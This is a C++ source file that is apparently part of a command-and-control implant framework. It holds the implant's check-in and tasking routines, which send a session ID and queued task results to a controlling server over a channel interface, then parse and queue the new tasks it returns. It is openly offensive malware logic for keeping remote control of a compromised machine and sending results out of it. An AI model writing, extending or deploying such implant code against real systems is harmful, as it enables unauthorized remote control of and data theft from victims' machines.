#include "Channel.h"
#include "Implant.h"

BOOL ImplantSendTasks( DWORD Count ) {
    json       packet;
    CHAR*      buffer           = NULL;
    DWORD      size             = 0;
    json       TaskRequestArray = json::array();
    json       TaskResultArray  = json::array();
    PTASK_INFO TaskInfo         = NULL;

    // create json array of tasks
    for (int i = 0; !IsListEmpty( &g_Implant.TaskResponseList ) && i < Count; i++) {
        PLIST_ENTRY Node     = RemoveHeadList( &g_Implant.TaskResponseList );
        TASK_INFO*  TaskInfo = CONTAINING_RECORD( Node, TASK_INFO, ListEntry );

        TaskResultArray.push_back( TaskInfo->Data );

        HeapFree( GetProcessHeap(), 0, TaskInfo );
    }

    packet["id"]    = g_Implant.SessionID;
    packet["tasks"] = TaskResultArray;

    auto serialized = packet.dump();
    if (!g_Channel->Interface->Send( g_Channel->Interface->Context, serialized.c_str(), serialized.size(), FALSE )) {
        puts( "[-] Failed to send request" );
        return FALSE;
    }

    // read server response
    if (!g_Channel->Interface->Receive( g_Channel->Interface->Context, &buffer, &size )) {
        puts( "failed to read response" );
        return FALSE;
    }

    if (!size) {
        return TRUE;
    }

    TaskRequestArray = json::parse( buffer );
    for (const json& Task : TaskRequestArray) {
        ImplantQueueTaskRequest( Task );
    }

    return TRUE;
}

BOOL ImplantSendCheckin( json& task, json& response ) {
    json  packet;
    CHAR* buffer = NULL;
    DWORD size   = 0;

    packet["id"]   = g_Implant.SessionID;
    packet["task"] = task;

    auto serialized = packet.dump();

    if (!g_Channel->Interface->Send( g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE )) {
        return FALSE;
    }

    // read server response
    if (!g_Channel->Interface->Receive( g_Channel->Interface->Context, &buffer, &size )) {
        return FALSE;
    }

    if (!size) {
        return FALSE;
    }

    response = json::parse( buffer, (CHAR*)buffer + size );

    return TRUE;
}

BOOL ImplantQueueTaskResult( json TaskResult ) {
    PTASK_INFO TaskInfo;

    // Store task result
    TaskInfo = (TASK_INFO*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( TASK_INFO ) );
    if (!TaskInfo) {
        printf( "[-] Failed to allocate heap memory for TAKS_INFO\n" );
        return FALSE;
    }

    TaskInfo->Data   = TaskResult;
    TaskInfo->Status = 1;

    InsertTailList( &g_Implant.TaskResponseList, &TaskInfo->ListEntry );

    return TRUE;
}

BOOL ImplantQueueTaskRequest( json TaskRequest ) {
    PTASK_INFO TaskInfo;

    // Store task result
    TaskInfo = (TASK_INFO*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( TASK_INFO ) );
    if (!TaskInfo) {
        printf( "[-] Failed to allocate heap memory for TAKS_INFO\n" );
        return FALSE;
    }

    TaskInfo->Data   = TaskRequest;
    TaskInfo->Status = 1;

    InsertTailList( &g_Implant.TaskRequestList, &TaskInfo->ListEntry );

    return TRUE;
}
